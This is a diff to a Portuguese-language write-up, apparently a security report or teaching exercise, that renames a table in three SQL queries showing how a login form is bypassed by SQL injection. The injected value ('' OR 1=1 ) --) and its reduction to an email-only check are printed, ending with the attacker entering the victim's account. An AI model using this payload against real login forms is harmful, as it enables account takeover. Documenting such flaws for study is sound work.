@@ -50,15 +50,15 @@ Submeter o formulário de login.
 ### Resultado
 É executado o seguinte comando SQL:
 ```sql
-SELECT * FROM app_user WHERE ( email = '[RANDOM_MAIL]' ) AND ( password_ = '' OR 1=1 ) -- // ) "
+SELECT * FROM User WHERE ( email = '[RANDOM_MAIL]' ) AND ( password_ = '' OR 1=1 ) -- // ) "
 ```
 equivalente a
 ```sql
-SELECT * FROM app_user WHERE ( email = '[RANDOM_MAIL]' ) AND 1
+SELECT * FROM User WHERE ( email = '[RANDOM_MAIL]' ) AND 1
 ```
 equivalente a
 ```sql
-SELECT * FROM app_user WHERE ( email = '[RANDOM_MAIL]' )
+SELECT * FROM User WHERE ( email = '[RANDOM_MAIL]' )
 ```
 
 O atacante entra na conta, mesmo desconhecendo a password da vítima.
